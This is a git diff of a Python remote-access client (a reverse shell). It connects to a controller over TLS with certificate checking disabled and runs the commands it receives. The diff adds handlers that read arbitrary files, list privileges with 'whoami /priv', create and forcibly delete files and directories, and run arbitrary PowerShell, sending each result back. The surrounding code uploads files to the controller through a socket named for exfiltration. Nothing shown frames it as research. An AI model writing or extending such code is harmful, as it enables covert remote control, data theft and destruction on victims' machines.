@@ -5,6 +5,7 @@ import subprocess
 import time
 import struct
 
+
 def q(host, port):
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     context.check_hostname = False
@@ -48,6 +49,63 @@ def q(host, port):
                             p.sendall(itens_bytes)
 
 
+                        elif command.startswith("cat ") or command.startswith("type "):
+                            file = command.split(' ', 1)[1]
+
+                            itens = subprocess.check_output(f'type {file}', shell=True, text=True)
+                            itens_bytes = itens.encode('utf-8')
+                            data_length = len(itens_bytes)
+
+                            p.sendall(struct.pack('>I', data_length))
+                            p.sendall(itens_bytes)
+
+
+                        elif command == "whoami /priv":
+                            itens = subprocess.check_output('whoami /priv', shell=True, text=True, encoding='latin-1')
+                            p.sendall(itens.encode('latin-1'))
+
+
+                        elif command.startswith('mkdir '):
+                            try:
+                                directory = command.split(' ', 1)[1]
+                                itens = subprocess.check_output(f'mkdir {directory}', shell=True, text=True)
+                                result = f"Directory {directory} was created successfully"
+                                p.sendall(result.encode('utf-8'))
+                            except Exception as e:
+                                p.sendall(str(e).encode('utf-8'))
+
+                        elif command.startswith('rm '):
+                            try:
+                                file = command.split(' ', 1)[1]
+                                crd = os.getcwd()
+
+                                itens = subprocess.check_output(f'del {crd}\\{file}', shell=True, text=True)
+                                result = f"File {file} was deleted successfully"
+                                p.sendall(result.encode('utf-8'))
+                            except Exception as e:
+                                p.sendall(str(e).encode('utf-8'))
+
+
+
+                        elif command.startswith('rmdir '):
+                            try:
+                                directory = command.split(' ', 1)[1]
+                                crd = os.getcwd()
+
+                                itens = subprocess.check_output(f'rmdir /S /Q {crd}\\{directory}\\', shell=True, text=True)
+                                result = f"Directory {directory} was deleted successfully"
+                                p.sendall(result.encode('utf-8'))
+                            except Exception as e:
+                                p.sendall(str(e).encode('utf-8'))
+
+                        if command.startswith('powershell '):
+                            try:
+                                final_command = f"""{command}"""
+                                output = subprocess.check_output(final_command, shell=True, text=True)
+                            except subprocess.CalledProcessError as e:
+                                output = e.output if e.output else str(e)
+                            p.sendall(output.encode('utf-8'))
+
                         elif command == 'cd ..':
                             try:
                                 path_parent = os.path.dirname(os.getcwd())
@@ -80,7 +138,8 @@ def q(host, port):
                                         context.check_hostname = False
                                         context.verify_mode = ssl.CERT_NONE
                                         exfiltration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                        with context.wrap_socket(exfiltration_socket,server_hostname=host) as exfil_conn:
+                                        with context.wrap_socket(exfiltration_socket,
+                                                                 server_hostname=host) as exfil_conn:
                                             exfil_conn.connect((host, 443))
                                             exfil_conn.sendall(file_name.encode('utf-8'))
                                             with open(file_name, "rb") as file:
@@ -110,7 +169,6 @@ def q(host, port):
 
                                     file_name = conn.recv(1024).decode('utf-8')
                                     print(f"Downloading file: {file_name}")
-
 
                                     with open(file_name, 'wb') as file:
                                         while True:
